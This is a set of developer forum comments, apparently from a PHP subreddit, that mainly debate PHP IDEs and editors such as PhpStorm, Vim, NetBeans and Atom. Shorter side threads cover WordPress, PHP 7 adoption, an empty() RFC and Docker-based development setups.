Appreciate the link as I was actually looking for this. Maybe I should restate the question... Excluding already deprecated functions, is there any function you would remove from php 7 and why? :)
Something like this should work: ob_start(); include 'file.php'; $body = ob_get_clean();
Yep this. However, normally I'll just use my projects templating library to do this. For example, using my own [Plates](http://platesphp.com/) templating library: ``` $html = $templates-&gt;render('some-html-email.php', ['name' =&gt; 'Jonathan']); ``` Now you can use the contents of `$html` to send your email.
So essentially **nothing** gets done
&gt;not about denying the reality? New here? 90% of people here &lt;3 php. Most of these people are aware of most of the shittiness there is to know and still in love with it, which looks a lot like denial to me. As I read somewhere, "It is hard for a man to admit something when his salary depends on them not admitting it"...Kind of explains this phenomenon... To see how shittty this sub is, [this](https://www.reddit.com/r/PHP/comments/52flak/a_long_time_php_developer_dips_his_foot_into_the/d7kk9lz) is the kind of shit that gets upvoted here...
You should write actual tests, as appropriate for whatever framework your API is being built in. Using Postman and such seems like a good idea, but it's really not. You want a full suite of acceptance tests for any non-trivial API. And they're too complicated and substantial to do manually in some Chrome plugin.
PhpStorm is a great IDE for PHP development. Since it is free to try for 30 days, why not give it a shot?
VIM user here too. First of all, why the hell are you getting downvoted for simply answering? I know this is PhpStorm territory but come on... I was offered PhpStorm at work. Tried it for a few days and found myself spending more time fighting it than actually working with it, so I returned to my VIM setup which has evolved through the last 16 years and served me very well throughout my programming life. It'll have to be one pretty fucking amazing piece of software that makes me prefer it over 16 years of refinement and habits. I'm glad people like PhpStorm and are getting a lot of value from it. I would hope those people would also understand that PhpStorm (or any "real IDE") just doesn't work for me. That's not because either tool is objectively better, it's just because we have different work flows and habits. (I can't believe I have to type up something like this every time this question is asked and someone answer something that's not PhpStorm.)
How's vs code for php? Does it offer anything other than syntax highlighting? 
Long-time VIM user here as well.After using VIM a long time for Python and Erlang development I made the switch to PHPStorm about a year ago because I couldn't seem to find a proper setup for PHP development in VIM (linting, namespace completion, code-formatting). Can you shed some light on the tools/plugins/overall setup you use?
&gt; Serve the files through PHP (e.g. file.php?file=myfile.txt) Oh good god this isn't a correct way at all. EDIT: I think OP needs to reconsider what he's trying to accomplish here. Either trust the user for what they upload or not.
That's understandable you need an ide for proper code completion. Even phpstorm has room for improvement on that aspect. 
1. TLDExtract uses actual PSL database from [separate package](https://github.com/layershifter/TLDDatabase), you do not need to think about its updates, simply update package from composer. 2. PublicSuffixList is a list of all **known public suffixes**, when you use it you must remember about its [**private** section](https://github.com/publicsuffix/list/blob/master/public_suffix_list.dat#L10635), simple example: ```$host = 'example.compute.amazonaws.com';``` ```$pslManager = new Pdp\PublicSuffixListManager();``` ```$parser = new Pdp\Parser((new Pdp\PublicSuffixListManager())-&gt;getList());``` ```$suffix = $parser-&gt;parseUrl($host)-&gt;host-&gt;publicSuffix; // returns "compute.amazonaws.com"``` ```$suffix = tld_extract($host)-&gt;getSuffix(); // returns "compute.amazonaws.com"``` ```$suffix = tld_extract($host, LayerShifter\TLDExtract\Extract::MODE_ALLOW_ICCAN)-&gt;getSuffix(); // returns "com"``` Or I missed something?
I was using Dreamweaver up until fairly recently, then started using PHP Storm, its worth every penny. 
Yeah he should use apache mod x sendfile instead
I switched to PhpStorm about 3 years ago and still love it. Code completion is great, clicking on a function goes to the definition and vice versa, it has an integrated REST client, Grunt support, PHPUnit coverage support, _tons_ of options for setting your code style, multiple cursor support, etc. I use it on both Windows and Ubuntu and it works great on both OSes.
Atom, with some hany plugins. What I really miss is a refactoring system like the one of Intellij. 
PHPStorm and Sublime Text. Hated PHPStorm for years, thought it was too huge, too slow, too fat. Then got a free license for an open source project and tried it. Took me some time to get used to it, now I don't want to miss it anymore. It's by far the best PHP IDE that exists and probably ever will. PHPStorm for the project I'm working on, Sublime Text to open files outside of my project scope quickly.
I have nothing against IDE and PhpStorm, as a matter of fact it is probably a better default choice for most people than Vim. I am a very *nix guy and I spend most of my work days in terminals, so Vim is simply my kind of tool--a bit abstruse, a bit on the old side, but so powerful.
Yup, for Java, it's really fast. Only the startup takes a while, once there it runs and runs and runs.
Just curious: why did you make your own frontend instead of using something like [Frisby](http://frisbyjs.com/) ?
It actually looks interesting, but personally, whenever I see these typical retina-optimized, previewed in Safari, displayed on a MacBook and iPhone websites that kinda all look the same, I try to avoid the product. We're developers, not fashion victims. And yes, it's pretty personal and subjective.
Those prices.... Not even GitHub charges that much for a complete hosting and integration service. I'd never use it and never recommend it to anyone :/
If you don't say PHPStorm you will get down voted here but I'm in a boat where I moved away from PHPStorm. I use NetBeans. There is nothing yet that I've not been able to achieve in NetBeans that PHPStorm could and the best thing? I don't have to pay the outrageous price to RENT a piece of software. Yes you never actually own PHPStorm you have to keep pouring money into them to keep using it.
Long time sublime user here. Had tried atom a few times but never found good php support until last week. In this subreddit someone posted about php-integrator which is a set of plugins for atom, I gave it a try and I think I'm not looking back. I recommend anyone to give it a try. Only problem is that is not as fast as sublime, you can tell there's some latency sometimes when typing, but it's a compromise I'm willing to make
Exactly. My point wasnt to highlight that WP isn't aimed at devs, but rather that as a developer you should appreciate good clean code and therefore know better than to choose WP.
i'm with you buddy, Keep It Simple Stupid :)
mayb because every client has the most rediculous requests for functionality and integrations to which WP has almost all answers, and that they want to use that template they found that is OFCOURSE, for WP, and mayb because it needs to be delivered the next day. Good luck with anything else, and oh btw, the agency across the street will deliver the next day if you cant.
Yeah, lol. I think it's Czech, it's definitely not Swedish though.
Looks like eastern European. Polish or Czech probably.
Well, if that is your level of quality, do whatever you prefer. I will continue to provide my customers with clean, secure and stable software, even in the parts they don't see. I don't care about customers that don't want quality work, they're not my audience and I'm not that desperate for money that I'd need to stick to them. Had a ton of WordPress sites hacked already and hacked quite a few by myself easily, everyone has different experiences. Your update button doesn't help when developers don't update the plugins you're using.
You make me increasingly optimistic.
Yeah Dreamweaver is for the window(er)s. I am a Linux penguin lol.
So far I am working on sublime 3. But, my go to is geany. I have been using it for eons now.
not him, but phpstorm has everything 
I really love PHPStorm and I use it every day (+ ST3 for rapid code editing). But I don't like the new JetBrains plans. Can't pay $19 every month, it's more expensive than my Adobe Photoshop licence u.u I bought PHPStorm 8 for $99 with a perpetual licence... and it was ok for me (renewal for $49) Definitively, I don't want to crack it so I'm searching for a good alternative.
ha ha... I see you (avatar-esque)
That is the ONLY thing holding me back :(
Hey! Howdy? I tried Eclipse, it is pathetic in terms of performance. I am coming from Geany (Notepad++ -ish) and Sublime. But, haven't tried Netbeans yet. Say on an 8 gig, core i5 system, would it be responsive enough? I guess, I would just download install and try it.
Used to be sold on NetBeans, but it didn't support PHP7. Then I switched to phpstorm. Still getting used to new hotkeys, but not missing NetBeans at all. 
aha... I will evaluate PHPStorm vs Netbeans now and update shortly.
&gt; it didn't support PHP7 Even now?
Yup! I would just check their website. Thanks for the info though. Really appreciate it.
It's polish I think.
Interesting you should ask, I'm on such a machine (Dell E7470) i5 and 8GB. Netbeans IS resource hungry when you have multiple projects open (it groups your code into projects). I currently have 6 Laravel projects and 8 CodeIgniter projects open and its using about 1.1GB of ram. Its completely responsive once loaded, I leave it open on my system all the time but when I do restart NetBeans (like Storm and the others) takes a few minutes to load in all your projects and scan over them. So I suppose the answer is, it depends, it depends on your workflow and the scale of your work. I wouldn't naturally mark out your current work flow because having something that can fire up rapidly (I use gEdit I'm on Linux) is brilliant for making small quick changes where you don't need code intelligence, build tools, auto complete etc.
What did you expect? It's not like every server on the internet will switch to new major version with breaking changes in half a year. Give it some time. Also performance gains, while impressive in benchmarks and overall welcome, are mostly not so noticeable in real world to convince everyone to spend time on upgrading. php 5.x with opcode cache is pretty fast already, and in most cases bottlenecks in website performance are coming from database or external resource queries, http requests and tasks like image processing, which are not affected by performance of php itself.
wait; so i can make a working demo withouth many details, validation and security and i won't be called a moron? this is a serious question btw.
&gt;Someone is estimating time, somewhere in the company. Either it's the person with the most visibility and knowledge (the developer), or it's the wrong person (a middle manager). That is exactly the kind of Product Owners i was referring to earlier. This has to stop. &gt;Either way, noone is going "oh we'll deliver, someday" at the client. Because it isn't someday, it is within the intervals and only what the team can afford to do. Both of these are created because the "client" (internal or external I don't care) is treated as not part of the agilre process. Hell, there is a lot to teach someone to fullfill their duties. It's a single workflow, not one workflow that has to align with another workflow of the receiver. The client is not absent from the equation. It's hard to teach them, but it's worth it if you really latch on to it.
Client takes the bait thinking they're getting a better deal, and doesn't understand they get what they pay for, then comes crawling back to you after blowing a few grand with a shit dev shop that only hires WP devs who can't actually program or solve real problems outside of the confines of WP.
Not using those frameworks, but I worked with Vim on RoR projects, which should be comparable. it's all files and lines of code, so I'm not sure why you would find it strange. Of course, I also use shell tools a lot, like ag, ctags etc. As a note aside, I still use PhpEd for debugging purposes, but I never, ever write code with it.
Why would you care about startup time? When you code, are you in the habit of closing and opening your IDE every 5 minutes?
You certainly can use Vim like another text editor with stranger key bindings--and many users do--but that's not what Vim is all about. The point of Vim is that everything is programmable, and can be fine-tuned according to your task and your preferences. Moving around is like running tiny scripts that you write on the fly. Same for copying, pasting, or replacing. Anything that you find doing too many times, you can automate. Again, many users don't optimize their typing because they get used to the repetition, or just don't know how to automate things quickly (Vimscript kind of sucks, admittdely)--but that's where the Vim power lays.
You can also do the EAP (Early Access Program) which is usually longer than 30 days. https://confluence.jetbrains.com/display/PhpStorm/PhpStorm+Early+Access+Program 
PHPStorm is the greatest thing since sliced bread.
I was a vim+tmux guy for maybe 10 years. Loved it. Couldn't get enough of that command line goodness. Then I tried PhpStorm. Seriously, it's that good. Especially when working on large codebases, you can just Cmd-click methods and classes to jump to their definitions or use Cmd-p to show the parameters that a method takes. Saves so much time.
You should take a look at NetBeans, it has all these features and its free, worth a look, nothing to lose.
yes it coming in 8.2
&gt; I'd like other viable options to exist, but there are none Out of interest what made you rule out NetBeans? What features did Storm have that NetBeans didn't?
Nah. But, the problem with Java based IDE's that I have seen over the years is the UI tends to be sluggish whenever the gc hits and that can be ridiculous sometimes. For a guy like me, who is adept at long haul programming (say 18-20 hours at a stretch at least 4 times a week) the gc can be really bothersome. But, I don't have that problem (as in sudden bouts of unresponsiveness) with sublime or geany.
Duh.. you would try getting one of 'em licenses for an OSS project not off the table yet :-)
Brutally honest!
Dreamweaver still exists? :O
Sublime Text 3 for a long time, then when i started working with frameworks alot i just couldnt bear it anymore and switched to PHPStorm
Another funny problem that I have: I develop with the following languages (not simultaneously most of the time, though): * PHP * JS (Node/Browser/Casper/Phantom/*monkey(s)) * Golang * Erlang * C, C++ (Seldom) * Java (Seldom) Now the stacks are usually: * LAMP * MEAN (Mongo, Express, Angular and Node) * Asterisk (VoIP) * FreeSwitch (VoIP) * Kamailio (VoIP) * Specific Golang environments * Specific C/C++ environments (like embedded system emulation et al) Now, there is no way in hell, I would ever install all of that into my poor old laptop or my office workstation. So, what do I use? **Docker**! I have all of the images configured. I fire up a docker container or two and start programming by mounting my local source code into the container and edit with sublime/geany. I just investigated Netbeans, PHPStorm, Sublime Text's plugins, Atom's plugins and all of them require the PHP runtime to be installed. I can't because I use docker and if I do install them, then it defeats the purpose of docker. Sounds like *a massive OSS project is waving at me*! Edit: formatting 
Honestly, I have yet to notice any slowdowns at all during use of PHPStorm outside of indexing, which only happens once during start-up or when files are changed outside of the editor. It's a memory hog for sure, but in return it's very fast to work with. At least give it a try, would be my advice.
I've used Docker a few times whilst freelancing for agencies but never rolled it myself I just haven't got on the hype train yet. I'm not sure how NetBeans handles Docker (or even if it does at all) so I can't help you on this matter.
&gt; you have no access to even point releases You don't, they don't hide that fact either. Purchase 2016.2 get ready too pay another £149.00 for 2016.3. They don't offer point release upgrades without you paying more. I can understand you trying to defend your favourite product and that's understandable, most people do, but for me (with my own money not a employers) this is simply ridiculous and is only in place to rape their customers. Even M$ don't charge for point release updates and they are the worst for milking customers.
What does that plugin give you in terms of features? 
Bad news bud. It doesn't. As for docker, at the prospect of sounding like a sales pitch, I will still enumerate a few advantages for us devs. I am not talking about the benefits of deployment in production. The docker guys have already done enough on that and they are doing it all the time lol. But, for us devs: * Multiple versions of LAMP/MEAN * Multiple environment configurations * Don't keep node running while you are on apache, dont keep apache running while you are working on Nginx... you get the hint * You have every benefit of a VM without the hunger for resources. And I can go on and on. The easiest thing to do is get `docker-compose` it is like say a `composer` for the docker world. You can quickly create multi-container setups and everything or you could do like I do, one simple shell script. Docker has really helped me avoid those sluggish PC's and general recognition of the fact that I need to upgrade my hardware. Plus, docker makes it really easy to ensure that every dev/user is on the **same** env. Try it. You won't regret.
Thanks for your reply! I've seen in both places I've posted (here and SO) that I should do it this way. I"m going to just set up a route for **/file/{params}** and serve the file based off that. I'll validate that the user is who they say they are and then serve the file via PHP. 
&gt; Dreamweaver is for the window(er)s. Don't insult us windows developers. We do have some dignity.
FYI there is a laravel subreddit 
atom
Oops! Please pardon my [frivolity](https://www.youtube.com/watch?v=5Giuw4ZF2sM). On a serious note, when are you coming to this side of town? You know, we can take you out for an Iced Tea or something. Cheers!
Same. NetBeans does the job, but is kind of buggy and isn't as feature-rich.
LXC is what I started with. LXC **is** the thing! Docker's just like a you know one of 'em cheap street walkers just for a quickie in the backseat. LXC was boss. I switched to docker 'cause it has been serving me well since time and it's relatively easy to teach to the new kids that keep showing up at my start-up. Edit: I mis-read LX**D** as LX**C**. Haven't tried LXD yet. But, I would sometimes soon. Atm, I am too heavily invested in docker, but, I keep hearing good things about it.
I really wonder why people voted against this RC, it seems a no brainer to me.
Just write a wrapper, it's not a big deal.
Do you use any frameworks like Symfony? I tried both Eclipse and Netbeans. Both of them left me wanting better Symfony support (Eclipse) or _any_ Symfony support at all (Netbeans). For example, IDEA (I use the full IDEA program, but PhpStorm is the same) let's me cmd-click services to go the defined class. If I have a service defined as, say, `web.manager.user`, then I can cmd-click that name in a service call like: $this-&gt;get('web.manager.user.)-&gt;getId(); and IDEA/PHPStorm will take me straight to the class. Alternatively, I can cmd-click the `getId()` part and be taken straight to that method. Similarly, IDEA/PHPStorm also understands Symfony defiitions like `MyBundle:HomeController:indexAction`, allowing them to be cmd-clicked as well. Also, templates: return $this-&gt;render('MyBundle:Home:index.html.twig'); routes: return $this-&gt;redirectToRoute('home_index'); There's also things like quickly being able to switch between a service class and it's definition, or quickly switch between a controller action, it's route definition, and it's templates, etc. There's so much more, as well. Keep in mind, it's just not being able to cmd-click to go from one place to another. IDEA/PHPStorm uses the same information and code awareness to do incredible autocompletion, type checking, code generation, etc. For example, if I have to add a dependency to a class: class MyClass { /** * @var Thing */ private $thing; public function __construct(Thing $thing) { $this-&gt;thing = $thing; } } Now I have to add it as an argument to the service definition. When I do so, IDEA/PHPStorm will automatically suggestion the correct class for the argument: &lt;service id="my.thing" class="MyBundle\Services\Thing"&gt; &lt;argument type="service" id=" &lt;-- This is where IDEA will give me autocomplete options, with Thing at the top, because contextually, it makes the most sense and should be the correct value &lt;/service&gt; None of these things worked in either Eclipse nor Netbeans. If someone know how to get all these features into either of those programs, please let me know. I'd love to give it a shot. Edit: accidentally a word
Same. I wrote a very simple ORM resembling ActiveRecord. It may be a few milliseconds slower than raw SQL queries, but you get so much readability in return.
I managed to grab an "All Products Pack"(all their IDEs) 2 year perpetual fallback license for $249. Their pricing can be very reasonable.
Ha ha, I always feel like a fanatic "**JOIN US**" when these topics come up. JetBrains is just one of those companies who you want to promote and share. 
My company has a WP plugin put out a few months ago that consumes our content api. So far all the people who had problems with it had old, very old php versions. The record holder had V5.2.6 ... he saw no reason to update, since his Wordpress still runs fine.
You missed this: g 
I used to do freelance WP work. I saw several installations that were hacked and used in a botnet. There was no splashy "Lol u been haxxed" screen; I only noticed the malicious code because I was doing my own custom work. 
I'm surprised you had no success with the click through of PHP code in NetBeans because that is one of the main features of why I love NetBeans, nothing saves more time than clicking on a class construct or a reference method and NetBeans jumping to the class/method to see the source. This works for all frameworks and your own code not in any framework which I find amazing (I fully understand PHPStorm can do this also). I have only worked with Symfony a hand full of times and NetBeans click through and docblock showing (sorry not sure of the technical term for it) has been a god send in larger projects. As for code completion NetBeans I love how it builds a function for you from the code you're referencing, like the below screenshot in Laravel (note NetBeans has no official Laravel support and I'm not using any plugins, it seems to have generated this code completion by simply reading the source code) it completes the methods in the class and constructs a skeleton of a function for you. https://s22.postimg.org/7b5bx9cg1/netbeans.png https://s22.postimg.org/67l7larsx/netbeans2.png I included ColorThief library in one of my projects (an external library for getting colours from an image, included using composer) and NetBeans (like PHPStorm) pulls all the data in for this plugin giving you the docs and function skeletons for each one of its methods instantly and code click through of course ;) https://s22.postimg.org/mhbdo72gx/netbeans3.png I'm not saying NetBeans is better than Storm, it would be impossible for a free opensource product to compete with a company charging £150 a version. I used Storm in my last job when they paid for the Licenses I found it (for what I need) no better or worse than NetBeans, certainly if it was my own money I wouldn't be purchasing it until it offered something above and beyond NetBeans.
I totally had forgotten about Dreamweaver. Man that was the jam back in the day. Good memories 
Interesting project, its written in PHP as well, not often I see IDE's or their plugins written in PHP. It would be good if that was ported to VS-Code so it has the performance gain as well. Thanks for linking!
And the rest are SublimeText and grandpas using Vim (seriously though you guys are badass). Then a few muttering Atom users.
Me too. Is there a place when we can see the discussion behind an RFC vote?
I use IntelliJ because it's required at work. We were using IntelliJ for Java already. It's great, but if you don't have someone more experienced to walk you through the million potential options, it's a bit painful.
I have always wanted to get acquainted to these lightweight editors but that's the problem, these are not IDEs just text editors. PHPStorm knows a bunch of stuff that helps me developing I kinda feel lost with just a text editor now. 
You're more than welcome to take over my RFC if you'd like to put it to vote again. I think I have the patch lying around somewhere (if not, it was trivial to write anyway). The main point of contention was around what the semantics should be when checking the multiple arguments. I chose for it to be logically OR'ing the arguments, so that if **any** arguments are falsy, then return *true*. Some wanted this, others wanted it to behave as if the arguments were AND'ed together, like what happens with `isset` (i.e. only return *true* if **all** arguments are falsy). I still stand by OR'ing the arguments for the following reasons: - it is far more common to want to check for the 'emptiness' of **any** variables (like those from form inputs). - `isset` has truthy semantics, where it checks for a variable being set. It returns true only if **all** arguments are set. `empty` on the other hand has falsy semantics, it only returns true if the argument is not set (or has an otherwise falsy value). It therefore makes sense for it to also have inverse semantics with respect to argument handling. A potential solution would be to include an optional flag as a last parameter to dictate what semantics empty should have. Such flags could be *EMPTY_AND* and *EMPTY_OR* to let the user choose. Even with this, though, I think there will still be contention around deciding upon what the default will be...
Will give it a try
Try the RFC's page on [Why Can't We Have Nice Things](https://why-cant-we-have-nice-things.mwl.be/requests/make-empty-a-variadic). No voters felt that having an implied `||` between the parameters instead of an implied `&amp;&amp;` is unexpected and counter-intuitive. Specifically, its behavior differs from variadic `isset($a,$b,$c)` in a confusing way.
WordPress is mainly for people who don't look at code and want a DIY setup. If everyone looked at or worked with the code no one would use WordPress.
I'm total Vim noob and thought /s/VIM/Vim would just replace it once. Very interesting thanks 
How do you come up with these ideas? Concurrency is far older than 90s, well researched and well handled by the ACID infrastructure. DDD was written in 2004 and gives detailed advices to keep locks fine granular. You seem to confuse things.
I use sublime as well. Just not for php. 
I'm a VIM guy myself, but — as mentioned elsewhere in these comments — that's primarily the result of 16 years of VIM-induced habits and customization. PhpStorm is a great IDE though, no doubt about that. Especially if you're just getting started and have no set ways yet. Same goes for NetBeans and Eclipse. They're not as smooth sailing out of the box, but on the other hand, they're free. In many cases editors like Visual Studio Code, Atom or Sublime will suffice and at least get you off to a great start. They're considerably lighter than a full IDE, but that's obviously because of the more limited feature set. But they still have all the most basic/necessary features — debugger, highlighting, auto-indent, linting, etc.
I kinda feel like this deserves a mention as it does a pretty good job of highlighting how/where Vim shines http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim#1220118
I use Dreamweaver because it's just what I have used for...ever. Works for me.
I've written very substantial PHP programs using only Vim. Once you get proficient with it, it's incredibly fast, and has pretty decent support for auto completion (though probably lower quality than an IDE designed for the language), although I've found that to not be nearly as valuable as most people find it to be. 
You find atom usable? Every time I've tried it (and this is with a clean reinstall as of a few days ago) it gets hideously slow for what it's doing and doesn't offer anything unless I add a ton of plugins which slow it down much more. 
Totally dig that. But still would love to see WP to pick up Composer &amp; Git driven workflows (so far Bedrock is ok) &gt; That would result in mass-adapation of PHP7 + Composer + Git.
[removed]
Not really, eap has breaks for a couple of months when the final release is out before the next eap session starts. 
&gt; https://php-integrator.github.io/ Whats the secret to setting this thing up? I really want to like atom, i reinstall it every 6 months hoping it is polished enough to do what I need. Every time it seems the experience is the same, you spend all day trying to get a combination of plugins to work the way they are supposed to. There is little to no dialogue when you do things with 3rd party plugins, so many plugins are hit or miss. Is this thing doing anything? Is it working? Just downloaded and installed atom and the php-integrator apps to see if things have matured a bit, nope. For example: PHP-Integrator-&gt;(Re)Index Project - And nothing happens, no error, no alert, no changes to anything on the status bar. Autocomplete doesn't work, in fact none of the 5+ php-integrator plugins seem to be doing anything at all. Go into the settings for autocomplete, there aren't any. Go into the settings for PHP-Integrator-Base, the path is correct. WTH. The docs say I need php 5.5 or better check, docs say i need sql-lite check. Github page is full of people whose environment blows up after a php-integrator update along with the obscure fix: "you didn't read the changelog did you? you need to run this and that an invoke Michael the Archangel on the 3rd hour of Feb 29th." Atom hasn't changed, I'll pass for now and check back in 6 months.
Try others if you must, but skip Netbeans and Zend Studio. PhpStorm for lyfe.
Codeception has a REST module: http://codeception.com/docs/modules/REST I highly recommend scripting your tests rather than doing them manually. It's more work up front, but after that you'll have a test suite ready to run till the end of time.
We made the switch, and our EC2 autoscale fleet needed 30% fewer machines. Gains are VERY noticeable. 
Don't see any use in this... Except for maybe a PHP-powered ATM :) Just put it up here in case anyone else may need it!
It looks like NetBeans does have a plugin for Symfony. I don't know if the level of support is comparable to PHPStorm's plugin, however. https://netbeans.org/bugzilla/show_bug.cgi?id=257708
Thanks for the link. Perhaps I'll check it out again. I remember trying Netbeans and Eclipse, both fairly recently, and using whatever Symfony-related plugins I could find. Both were lacking, compared to PHPStorm. I'll at least keep an eye on that, though. Edit: Ah, yes. I do remember this now. I think it had basic support for starting a new Symfony project, and maybe a bit of autocomplete/jumping around. Far from complete, though, and it still seems to be (as compared to PHPStorm). Still, I'll keep my eye on it, in case it improves. Same with Eclipse. For now, though, PHPStorm wins by far for me.
I'm still using NetBeans but it can get really slow and freezes sometimes. Must try PhpStorm again. Does PhpStorm freeze? Or get slow?
I'm still using taco. Unfortunately it has been discontinued... So perhaps soon I'll be in the market for a multi language editor.
+1 for the link mate. Reading it now.
yeah right.. and then program the *whole* project on a remote interpreter where byte[]'s are sent through ssh. Awesome! Please don't be Poe's Law'd
Right, but it's also less used ;)
ACID is not magic. If you don't know what it guarantees and more importantly what it *doesn't* guarantee, you'll end up with inconsistent data state. In the example given in the article, the "specification" has no way of knowing if the balance it's checking is up to date, or it has changed (or it'll change before the commit is made on updating said balance). 
&gt; I think the "speed" in vim is basically your typing speed. No, really not, the speed comes from something else. Let's say you start from scratch with vim, and want to make a real php IDE. What I started to do at first was install a menu plugin like NERDTree to get a nice menu to the left. I came from eclipse and already used fuzzy matching, and had notice that is was really a faster way to open a file. Then I discovered [CtrlP](https://github.com/ctrlpvim/ctrlp.vim), and removed the menu. Later, I replaced CtrlP with [fzf.vim](https://github.com/junegunn/fzf.vim) and now I think I'm faster at opening files or any tag (be it a class or function) than I ever was, because the shortcuts I setup are very short : I'm french, so I remapped all french chars to very useful functions, since these shortcuts are not taken by something else : - `é` opens a buffer list - `à` opens the list of all files in the project - `§` open the list of all tags Please note that fzf can be used outside vim, so if you don't use vim, you should install [fzf](https://github.com/junegunn/fzf) anyway, it really speeds you up for browsing your shell history or finding a file. And that's one thing I really like with vim : it integrates with the unix ecosystem, with completely independant commands. For instance, the default search tool is grep, but you can use the much faster [ag](https://github.com/ggreer/the_silver_searcher). Now that I don't need a menu, what do I do with all that space? Given I try to keep line length under 120 characters (or even 80 if I can), I have a big unused space to the right. I type `:vs` and poof! A new window appears. That's how I discovered that the best way to be faster with your IDE is to use split Windows. IMO, when you use something like a java IDE, you will browse your project and often end up doing some cleanup in the tabs you have (not to be confused with vim tabs, which are really workspaces). Even if you can keep the tab count down, navigating is slow b/c you only have the tab name to help you find the tab you want, and you browse them linearly. When in a code session editing, you often work on ~4 files at a time : a controller, a view, a service, it's unit test, a translation file… Most of the time, I have 4 windows opened and I can navigate with `Ctrl+{H,J,K,L}`, without reaching for the arrow keys or such. And that's where I get most of my speed from I think. From a very low-level, basic editing function. By default, vim doesn't show you the buffers, and I think this is deliberate : they know you don't care about all the files you open, but only about some of them, which should be displayed in a window. I think the next source of speed is the fact that since shortcuts are composable, you can build them without really memorizing the whole shortcut, but only its components : `dap` is "delete ambient paragraph", `dt)` is "delete to the next parenthesis". So you can be very efficient at moving, without remembering much. That's something that you don't find in many text editors. There are also little things like the fact that `Ctrl+Z` will interrupt vim like it would interrupt any process if you are in a terminal. That and the fact that you want as much space as you can makes me use vim over gvim, and [the i3 tiling window manager](http://i3wm.org/). TL;DR : - remove left menu, use fzf to find files instead, it's faster - maximize your windows (with a tiling wm, for instance) and use gvim so that you have a lot of space - fill the space with split windows, and keep your code under 120 chars so that it still looks good - integrate with the fast tools you now : fzf, ag, [pman](https://github.com/gonzaloserrano/pman-php-manual)
I use and contributed to [this plugin](https://github.com/arnaud-lb/vim-php-namespace/) (I contributed a feature that will sort use statements on insertion). For extreme speed, I recommend ag and fzf, see [my other answer](https://www.reddit.com/r/PHP/comments/530h7h/php_devs_what_ide_or_text_editor_are_you_using/d7pi5lv)
Congratulations, I have no idea if you're trying to articulate an actual argument of some kind, or just making a joke. Well done.
Lone Zend Studio user here. I use it because it does all I need, simple enough.
This is pretty great. Thanks a lot for sharing this! 
That is really nice. Definately bookmarked and should be put here in this subreddit on the right info side card.
Bookmarked here too. This will come in handy as a nice quick reference. Thanks!
Depends what I am working on. If it's for editing a bash script or a quick edit of a file then I will use Sublime Text, unless that is the edit is on a server like a config then I will use vim. For more involved development work like working on a symfony based project then I will use PHPStorm.
Ok, I ended up getting it working and it was EASY. I have installed and "uninstalled" various versions of Atom from my current machine countless times in the past 4 years. It seems that the supporting data buried in hidden home directories in mac was the culprit, deleted the following files: ~/.atom /usr/local/bin/atom /usr/local/bin/apm ~/Library/Preferences/com.github.atom.plist and then relaunching atom as a fresh install fixed the problem. I then installed Project Manager added working folder as a new project, installed PHP Integrator followed by PHP Integrator Autocomplete Plus and I got all sorts of friendly messages telling me that it was indexing and doing it's thing. Voila! It looks like years of atom wonkiness was the result of old leftover supporting app data. 
That would be good. I'm not a big fan of Oracle and I think getting anything out of their hands is a good idea. 
 composer global require squizlabs/php_codesniffer Would be simpler and cross platform. Also, PHP Mess Detector wouldn't be a bad option to use either. composer global require phpmd/phpmd
Vim + Netbeans are enough to meet my needs.
I used VIM exclusively for quite a while for the bulk of the PHP I wrote. I still use it when I'm mucking around with PHP source. But over the past year or two I've pretty much only used PhpStorm. All of the integration with git, composer, type hints, namespace auto-complete, etc outweighed my efficiency with VIM. But I will still use it for small throwaway scripts from the CLI.
In my experience, storing currency as an integer at the lowest subunit (e.g. pence) is less error prone than dealing with floats, given you don't have to worry about precision at both the database and application level. When introducing something like a VAT calculation you just round to the nearest penny (or drop the fractional entirely depending on the currency), then you'd divide back to your main unit (e.g. by 100 since £1 = 100p) when you're ready to display the value to a user.
As someone whose knowledge maxes out on what would be better described as advanced scripts (mostly just little web apps that talk back and forth with several web apis. Just lots of json, xml, loops, math, and sql) and knows nothing about OOP: would phpstorm have any benefits for me? Or is it like someone who only needs paint using photoshop? I currently use notepad++ and vs code. I don't use frameworks or anything. 
For what it's worth, I see the other way... but to be explicit, you'd need `any_empty()` and `all_empty()`.
sorry for being a noob, but how would this look in the context of a phpmailer script.
I wrote a small library for "mocking" built-in functions, but it requires namespaces https://github.com/chadicus/test-helpers
Looks like the UML tool that's included in IntelliJ IDEA
Writing those blog posts is surprisingly time-consuming, and they tend to be easy to let fall by the wayside in lieu of actual coding work :) In any event, the 3.15 release did just get a blog post: http://hhvm.com/blog/11711/hhvm-3-15
that seems to be how the big payment processors handle it.
You really should place your files anywhere but the webserver for many reasons, not the least of which ensuring you can recover easily from server issues. S3 is a good choice, one among many.
congratulations for all the HHVM team, we all know PHP 7 would not happen, or would take longer, if HHVM didn't exist. Without a changelog it's hard to know what's happening, but i know it's hard to keep it updated. By the way, I think many of the Hack additions are really good and could be useful in PHP, although some of them look too experimental. Right now HHVM is too risky for most PHP programmers as PHP 7 is just as fast and it seems that anything not related with Facebook's code will take longer to happen. Too bad HHVM isn't a fork of PHP, it would make it possible to cherrypick HHVM improvements back to PHP and vice-versa. Hope you guys improve it even more and prove me wrong.
I don't think concurrency is something that business rules need to be aware of - that should be handled at the editing layer, through whatever validation you have. Attempting to edit an old resource is a validation failure, not a business rule exception. 
Both IntelliJ IDEA and PHPStorm, where these UML models were created, are by JetBrains. That explains the similarity you see. 
EA inspections FTW: https://plugins.jetbrains.com/plugin/7622?pr=phpStorm
I don't really like the example..I mean if I have to check if someone can transfer money on several places, I will make one service which does the work and use it everywhere..why bother with all that unnecessary code..and actually I prefer a transaction exception approach..so if the amount of money is 0 I would rather throw an exception and the same with the active user. This way you have also a customized message..and you can just do a rollback if anything unexpected happens
I'd make financial contributions to a tutorial series dedicated to what you've detailed. Edit: I develop using PhpStorm. I've grown more as a developer the last year of using this tool than I have in the last five years. However, I've seen some folks fly using Vim and it seems like it's worth a shot.
Apps: * http://www.sololearn.com/Course/PHP/ * https://www.codecademy.com/lrn/php Book: * https://www.amazon.com/Modern-PHP-Features-Good-Practices/dp/1491905018 Official manual: * http://php.net/manual/en/index.php
[removed]
I wouldn't say it's for lazy developers but at the same time devs really should be asking themselves if it's an appropriate choice. It's *very* easy to get unintended results from ```empty()```.
When I first started using it it was really slow. Since then they've made lots of improvements. The startup time is still significantly slower, but not anything that's disruptive to my workflow given that I really only ever open it once during a workday and it just stays opens. Everything else seems quite snappy most of the time and I have a pretty decent amount of plugins installed.
